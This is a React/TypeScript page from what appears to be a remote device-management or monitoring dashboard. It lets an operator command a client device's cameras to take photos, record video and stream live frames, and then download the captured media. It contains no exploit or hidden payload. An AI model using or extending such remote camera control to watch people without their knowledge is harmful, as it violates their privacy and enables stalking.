import { useState, useCallback, useRef, useEffect } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, ClientFile, CameraDevice } from '@/types';
import { CMD, extractList } from '@/types';
import { DevicePageHeader, SectionCard, LoadingSkeleton, StatusBadge } from '@/components/device/shared';
import { DataActionsMenu, buildFileActions } from '@/components/device/DataActionsMenu';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Camera as CameraIcon, Image, AlertCircle, X, Download, ZoomIn, Video, Square, Circle, Radio } from 'lucide-react';
import { onDataUpdate, onCameraStream } from '@/services/socket';
import { AuthImage, AuthVideo, downloadAuthFile } from '@/components/AuthMedia';

export default function CameraPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [capturingId, setCapturingId] = useState<number | null>(null);
  const [captureError, setCaptureError] = useState<string | null>(null);
  const [flashMode, setFlashMode] = useState<string>('auto');
  const [quality, setQuality] = useState<string>('medium');
  const [lightboxPhoto, setLightboxPhoto] = useState<ClientFile | null>(null);
  const [lightboxVideo, setLightboxVideo] = useState<ClientFile | null>(null);
  const [recordingCameraId, setRecordingCameraId] = useState<number | null>(null);
  const [recordSeconds, setRecordSeconds] = useState(0);
  const captureTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const recordTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [streaming, setStreaming] = useState(false);
  const [streamCamId, setStreamCamId] = useState<number | null>(null);
  const [streamInterval, setStreamInterval] = useState(100);
  const [liveFps, setLiveFps] = useState(0);
  const streamCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const streamUrlRef = useRef<string | null>(null);
  const lastFrameTsRef = useRef(0);
  const frameCountRef = useRef(0);
  const fpsTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => {
      if (captureTimerRef.current) clearTimeout(captureTimerRef.current);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
      if (recordingCameraId !== null && clientId) {
        clientsApi.sendCommand(clientId, CMD.CAMERA, { action: 'stop' }).catch(() => {});
      }
    };
  }, [recordingCameraId, clientId]);

  const { data: rawData, loading, error, refresh, sendCommand, commandStatus, commandId, clearData } = useDeviceData<{
    cameras: CameraDevice[];
    photos: ClientFile[];
    videos: ClientFile[];
    permission: boolean | null;
  }>({
    clientId,
    page: 'camera',
    extractData: (d) => ({
      cameras: extractList<CameraDevice>(d.cameras),
      photos: Array.isArray(d.photos) ? d.photos : [],
      videos: Array.isArray(d.videos) ? d.videos : [],
      permission: d.permission === true || d.permission === false ? d.permission : null,
    }),
    dataType: 'camera',
    defaultValue: { cameras: [], photos: [], videos: [], permission: null },
  });

  const cameras = rawData.cameras;
  const photos = rawData.photos;
  const videos = rawData.videos;
  const permission = rawData.permission;

  const [exporting, setExporting] = useState(false);

  const fileActions = buildFileActions({
    files: [
      ...photos.map((p) => ({ url: `/api/files/photos/${clientId}/${p.id}`, name: p.originalName })),
      ...videos.map((v) => ({ url: `/api/files/videos/${clientId}/${v.id}`, name: v.originalName })),
    ],
    metadata: [...photos, ...videos],
    exportPrefix: 'camera-media',
    onClear: clearData,
    onExportStart: () => setExporting(true),
    onExportEnd: () => setExporting(false),
  });

  const listCameras = useCallback(async () => {
    setCaptureError(null);
    try {
      await sendCommand(CMD.CAMERA, { action: 'list' });
    } catch {
      setCaptureError('Failed to detect cameras.');
    }
  }, [sendCommand]);

  const didAutoDetect = useRef(false);
  useEffect(() => {
    if (!didAutoDetect.current && online && cameras.length === 0) {
      didAutoDetect.current = true;
      listCameras();
    }
  }, [online, cameras.length, listCameras]);

  const captureCmdIdRef = useRef<string | null>(null);

  const capturePhoto = async (cameraId: number) => {
    setCapturingId(cameraId);
    setCaptureError(null);
    captureCmdIdRef.current = null;
    try {
      const cmdId = await sendCommand(CMD.CAMERA, { action: 'capture', id: cameraId, flash: flashMode, quality });
      captureCmdIdRef.current = cmdId;
    } catch (err: any) {
      setCaptureError(err?.response?.data?.error || 'Capture failed.');
      setCapturingId(null);
      return;
    }
    captureTimerRef.current = setTimeout(() => setCapturingId(null), 30000);
  };

  useEffect(() => {

    if (commandStatus === 'responded' || commandStatus === 'error') {
      if (capturingId !== null && captureCmdIdRef.current && commandId === captureCmdIdRef.current) {
        if (captureTimerRef.current) {
          clearTimeout(captureTimerRef.current);
          captureTimerRef.current = null;
        }
        setCapturingId(null);
        captureCmdIdRef.current = null;
        if (commandStatus === 'error') setCaptureError('Capture failed on device.');
      }
    }
  }, [commandStatus, commandId, capturingId]);

  const startRecording = async (cameraId: number) => {
    setCaptureError(null);
    try {
      await sendCommand(CMD.CAMERA, { action: 'record', id: cameraId });
      setRecordingCameraId(cameraId);
      setRecordSeconds(0);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
      recordTimerRef.current = setInterval(() => setRecordSeconds(s => s + 1), 1000);
    } catch (err: any) {
      setCaptureError(err?.response?.data?.error || 'Failed to start recording.');
    }
  };

  const stopRecording = async () => {
    try {
      await sendCommand(CMD.CAMERA, { action: 'stop' });

      setRecordingCameraId(null);
      if (recordTimerRef.current) {
        clearInterval(recordTimerRef.current);
        recordTimerRef.current = null;
      }
    } catch {
      setCaptureError('Failed to stop recording. Device may still be recording.');

    }
  };

  useEffect(() => {
    const unsub = onDataUpdate((cid, dataType, payload) => {
      if (cid !== clientId || dataType !== 'camera') return;
      if (payload?.streamStatus === 'streaming') {
        const camId = typeof payload.cameraId === 'number' ? payload.cameraId : null;
        setStreaming(true);
        if (camId !== null) setStreamCamId(camId);
      } else if (payload?.streamStatus === 'stopped') {
        setStreaming(false);
        setStreamCamId(null);
        if (streamUrlRef.current) { URL.revokeObjectURL(streamUrlRef.current); streamUrlRef.current = null; }
      } else if (payload?.videoStatus === 'recording') {
        const camId = typeof payload.cameraId === 'number' ? payload.cameraId : null;
        if (camId !== null && recordingCameraId === null) {
          setRecordingCameraId(camId);
          setRecordSeconds(0);
          if (recordTimerRef.current) clearInterval(recordTimerRef.current);
          recordTimerRef.current = setInterval(() => setRecordSeconds(s => s + 1), 1000);
        }
      } else if (payload?.videoStatus === 'stopped') {
        setRecordingCameraId(null);
        if (recordTimerRef.current) {
          clearInterval(recordTimerRef.current);
          recordTimerRef.current = null;
        }
      } else if (payload?.videoStatus === 'error') {
        if (typeof payload.cameraId !== 'number' || payload.cameraId === recordingCameraId) {
          setRecordingCameraId(null);
          if (recordTimerRef.current) {
            clearInterval(recordTimerRef.current);
            recordTimerRef.current = null;
          }
        }
        setStreaming(false);
        setStreamCamId(null);
        if (streamUrlRef.current) { URL.revokeObjectURL(streamUrlRef.current); streamUrlRef.current = null; }
        if (typeof payload.error === 'string') setCaptureError(payload.error);
      }
    });
    return unsub;
  }, [clientId]);

  useEffect(() => {
    const unsub = onCameraStream((meta, binary) => {
      if (meta.id !== clientId) return;
      const ts = typeof meta.timestamp === 'number' ? meta.timestamp : 0;
      if (ts < lastFrameTsRef.current) return;
      lastFrameTsRef.current = ts;
      frameCountRef.current++;
      const blob = new Blob([binary], { type: 'image/jpeg' });
      const url = URL.createObjectURL(blob);
      const img = new (window.Image || window.HTMLImageElement)() as HTMLImageElement;
      img.onload = () => {
        const canvas = streamCanvasRef.current;
        if (canvas) {
          if (canvas.width !== img.naturalWidth) canvas.width = img.naturalWidth;
          if (canvas.height !== img.naturalHeight) canvas.height = img.naturalHeight;
          const ctx = canvas.getContext('2d');
          if (ctx) ctx.drawImage(img, 0, 0);
        }
        URL.revokeObjectURL(url);
      };
      img.onerror = () => URL.revokeObjectURL(url);
      img.src = url;
    });
    return () => { unsub(); if (streamUrlRef.current) URL.revokeObjectURL(streamUrlRef.current); };
  }, [clientId]);

  useEffect(() => {
    if (!streaming) {
      setLiveFps(0);
      frameCountRef.current = 0;
      if (fpsTimerRef.current) { clearInterval(fpsTimerRef.current); fpsTimerRef.current = null; }
      return;
    }
    frameCountRef.current = 0;
    fpsTimerRef.current = setInterval(() => {
      setLiveFps(frameCountRef.current);
      frameCountRef.current = 0;
    }, 1000);
    return () => {
      if (fpsTimerRef.current) { clearInterval(fpsTimerRef.current); fpsTimerRef.current = null; }
    };
  }, [streaming]);

  useEffect(() => {
    return () => { if (fpsTimerRef.current) clearInterval(fpsTimerRef.current); };
  }, []);

  useEffect(() => {
    if (!online && streaming) {
      setStreaming(false);
      setStreamCamId(null);
      if (streamUrlRef.current) { URL.revokeObjectURL(streamUrlRef.current); streamUrlRef.current = null; }
    }
  }, [online, streaming]);

  const streamingRef = useRef(false);
  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  useEffect(() => {
    return () => {
      if (streamingRef.current && clientId) {
        clientsApi.sendCommand(clientId, CMD.CAMERA, { action: 'stream_stop' }).catch(() => {});
      }
      if (streamUrlRef.current) URL.revokeObjectURL(streamUrlRef.current);
      setStreaming(false);
      setStreamCamId(null);
    };
  }, [clientId]);

  const startStream = async (camId: number) => {
    setStreaming(true);
    setStreamCamId(camId);
    const q = quality === 'low' ? 30 : quality === 'high' ? 80 : 50;
    try {
      const res = await clientsApi.sendCommand(clientId, CMD.CAMERA, { action: 'stream_start', id: camId, quality: q, interval: streamInterval });
      if (!res.data?.sent) {
        setStreaming(false);
        setStreamCamId(null);
        setCaptureError('Device offline. Stream queued.');
      }
    } catch {
      setStreaming(false);
      setStreamCamId(null);
    }
  };

  const stopStream = async () => {
    try { await clientsApi.sendCommand(clientId, CMD.CAMERA, { action: 'stream_stop' }); } catch {}
    setStreaming(false);
    setStreamCamId(null);
    if (streamUrlRef.current) { URL.revokeObjectURL(streamUrlRef.current); streamUrlRef.current = null; }
  };

  const formatTimer = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Camera"
        subtitle={`${cameras.length} cameras, ${photos.length} photos, ${videos.length} videos`}
        actions={[
          { label: 'Detect', icon: CameraIcon, onClick: listCameras, disabled: !online || capturingId !== null },
        ]}
        moreActions={<DataActionsMenu actions={fileActions} disabled={loading} loadingLabel={exporting ? 'Export ZIP' : null} />}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {permission !== null && (
        <StatusBadge label={permission ? 'Permission Granted' : 'Permission Denied'} status={permission ? 'success' : 'danger'} />
      )}

      {captureError && (
        <div className="p-3 rounded-lg bg-destructive/10 border border-destructive/20 text-destructive text-sm flex items-center gap-2">
          <AlertCircle className="h-4 w-4 shrink-0" />
          {captureError}
          <button onClick={() => setCaptureError(null)} className="ml-auto"><X className="h-3.5 w-3.5" /></button>
        </div>
      )}

      {}
      {recordingCameraId !== null && (
        <div className="flex items-center gap-3 p-3 rounded-lg bg-red-500/10 border border-red-500/20">
          <Circle className="h-4 w-4 text-red-500 animate-pulse fill-red-500" />
          <span className="text-sm font-mono font-bold text-red-500">{formatTimer(recordSeconds)}</span>
          <span className="text-xs text-muted-foreground">Recording...</span>
          <Button variant="destructive" size="sm" onClick={stopRecording} className="ml-auto gap-1.5 h-7">
            <Square className="h-3.5 w-3.5" /> Stop
          </Button>
        </div>
      )}

      {}
      {cameras.length > 0 && (
        <div className="flex items-center gap-3 flex-wrap">
          <div className="flex items-center gap-1.5">
            <span className="text-xs text-muted-foreground">Flash:</span>
            {['auto', 'on', 'off'].map(f => (
              <button key={f} onClick={() => setFlashMode(f)} className={`text-xs px-2.5 py-1 rounded-md transition-colors capitalize ${flashMode === f ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground hover:bg-muted/70'}`}>{f}</button>
            ))}
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-xs text-muted-foreground">Quality:</span>
            {['low', 'medium', 'high'].map(q => (
              <button key={q} onClick={() => setQuality(q)} disabled={streaming} className={`text-xs px-2.5 py-1 rounded-md transition-colors capitalize disabled:opacity-50 disabled:cursor-not-allowed ${quality === q ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground hover:bg-muted/70'}`}>{q}</button>
            ))}
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-xs text-muted-foreground">Target FPS:</span>
            <select value={streamInterval} onChange={e => setStreamInterval(parseInt(e.target.value))} disabled={streaming} className="text-xs bg-muted rounded px-1.5 py-1 disabled:opacity-50 disabled:cursor-not-allowed">
              <option value={66}>15 FPS</option>
              <option value={100}>10 FPS</option>
              <option value={200}>5 FPS</option>
              <option value={500}>2 FPS</option>
            </select>
          </div>
        </div>
      )}

      {loading && !error ? (
        <LoadingSkeleton rows={4} />
      ) : (
        <>
          {streaming && (
            <SectionCard title="Live Stream" icon={Radio}>
              <div className="space-y-3">
                <div className="relative bg-black rounded-lg overflow-hidden flex items-center justify-center" style={{ minHeight: '300px' }}>
                  <canvas ref={streamCanvasRef} className="max-w-full max-h-[400px] object-contain" />
                  <div className="absolute top-2 left-2 flex items-center gap-1.5 bg-red-500/90 text-white text-[10px] px-2 py-0.5 rounded-full">
                    <Circle className="h-2 w-2 fill-white animate-pulse" /> LIVE
                  </div>
                </div>
                <div className="flex items-center gap-3 flex-wrap">
                  <div className="flex items-center gap-1.5">
                    <span className="text-xs text-muted-foreground">Target:</span>
                    <span className="text-xs font-mono px-2 py-0.5 rounded bg-muted text-muted-foreground">{Math.round(1000 / streamInterval)} FPS</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="text-xs text-muted-foreground">Live:</span>
                    <span className={`text-xs font-mono px-2 py-0.5 rounded border ${liveFps > 0 ? 'bg-green-500/15 text-green-500 border-green-500/20' : 'bg-muted text-muted-foreground border-transparent'}`}>{liveFps} FPS</span>
                  </div>
                </div>
              </div>
            </SectionCard>
          )}

          {cameras.length > 0 && (
            <SectionCard title="Available Cameras">
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                {cameras.map((cam, i) => (
                  <Card key={`cam-${cam.id ?? i}`} className="shadow-none bg-muted/40">
                    <CardContent className="p-3 text-center">
                      <CameraIcon className="h-6 w-6 mx-auto mb-1.5 text-primary" />
                      <p className="font-medium text-xs">{cam.name || `Camera ${i + 1}`}</p>
                      <p className="text-[10px] text-muted-foreground mb-2">ID: {cam.id ?? i}</p>
                      <div className="flex gap-1.5 justify-center">
                        <Button size="sm" onClick={() => capturePhoto(cam.id ?? i)} disabled={capturingId !== null || recordingCameraId !== null || streaming || !online} className="h-7 text-xs">
                          {capturingId === (cam.id ?? i) ? '...' : 'Capture'}
                        </Button>
                        {recordingCameraId === (cam.id ?? i) ? (
                          <Button variant="destructive" size="sm" onClick={stopRecording} className="h-7 text-xs gap-1">
                            <Square className="h-3 w-3" /> Stop
                          </Button>
                        ) : (
                          <Button variant="outline" size="sm" onClick={() => startRecording(cam.id ?? i)} disabled={capturingId !== null || recordingCameraId !== null || streaming || !online} className="h-7 text-xs gap-1">
                            <Video className="h-3 w-3" /> Record
                          </Button>
                        )}
                      </div>
                      {streamCamId === (cam.id ?? i) && streaming ? (
                        <Button variant="destructive" size="sm" onClick={stopStream} className="h-7 text-xs gap-1 mt-1.5 w-full">
                          <Square className="h-3 w-3" /> Stop Live
                        </Button>
                      ) : (
                        <Button variant="outline" size="sm" onClick={() => startStream(cam.id ?? i)} disabled={capturingId !== null || recordingCameraId !== null || streaming || !online} className="h-7 text-xs gap-1 mt-1.5 w-full">
                          <Radio className="h-3 w-3" /> Live
                        </Button>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </div>
            </SectionCard>
          )}

          {}
          {videos.length > 0 && (
            <SectionCard title={`Videos (${videos.length})`} icon={Video}>
              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
                {videos.map((video) => (
                  <div key={`vid-${video.id}`} className="relative group">
                    <div className="aspect-video bg-muted rounded-lg overflow-hidden cursor-pointer flex items-center justify-center" onClick={() => setLightboxVideo(video)}>
                      <Video className="h-8 w-8 text-muted-foreground" />
                      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-colors flex items-center justify-center">
                        <ZoomIn className="h-5 w-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground mt-0.5 truncate">{video.originalName}</p>
                  </div>
                ))}
              </div>
            </SectionCard>
          )}

          {}
          <SectionCard title={`Photos (${photos.length})`} icon={Image}>
            {photos.length === 0 ? (
              <div className="py-6 text-center">
                <Image className="h-8 w-8 mx-auto mb-2 text-muted-foreground/40" />
                <p className="text-sm text-muted-foreground">No photos captured</p>
              </div>
            ) : (
              <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-6 gap-2">
                {photos.map((photo) => (
                  <div key={`photo-${photo.id}`} className="relative group">
                    <div className="aspect-square bg-muted rounded-lg overflow-hidden cursor-pointer" onClick={() => setLightboxPhoto(photo)}>
                      <AuthImage src={`/api/files/photos/${clientId}/${photo.id}`} alt={photo.originalName} className="w-full h-full object-cover" loading="lazy" />
                      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-colors flex items-center justify-center">
                        <ZoomIn className="h-5 w-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground mt-0.5 truncate">{photo.originalName}</p>
                  </div>
                ))}
              </div>
            )}
          </SectionCard>
        </>
      )}

      {}
      {lightboxPhoto && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4" onClick={() => setLightboxPhoto(null)}>
          <div className="relative max-w-3xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
            <AuthImage src={`/api/files/photos/${clientId}/${lightboxPhoto.id}`} alt={lightboxPhoto.originalName} className="max-w-full max-h-[80vh] rounded-lg" />
            <div className="flex items-center justify-center gap-3 mt-3">
              <Button variant="outline" size="sm" className="gap-1.5" onClick={async () => { const ok = await downloadAuthFile(`/api/files/photos/${clientId}/${lightboxPhoto.id}`, lightboxPhoto.originalName); if (!ok) setCaptureError('Failed to download photo.'); }}>
                <Download className="h-4 w-4" /> Download
              </Button>
            </div>
            <button className="absolute -top-3 -right-3 bg-background rounded-full p-1.5 shadow-lg" onClick={() => setLightboxPhoto(null)}>
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>
      )}

      {}
      {lightboxVideo && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4" onClick={() => setLightboxVideo(null)}>
          <div className="relative max-w-4xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
            <AuthVideo
              src={`/api/files/videos/${clientId}/${lightboxVideo.id}`}
              controls
              autoPlay
              className="max-w-full max-h-[80vh] rounded-lg"
            />
            <div className="flex items-center justify-center gap-3 mt-3">
              <Button variant="outline" size="sm" className="gap-1.5" onClick={async () => { const ok = await downloadAuthFile(`/api/files/videos/${clientId}/${lightboxVideo.id}`, lightboxVideo.originalName); if (!ok) setCaptureError('Failed to download video.'); }}>
                <Download className="h-4 w-4" /> Download
              </Button>
            </div>
            <button className="absolute -top-3 -right-3 bg-background rounded-full p-1.5 shadow-lg" onClick={() => setLightboxVideo(null)}>
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
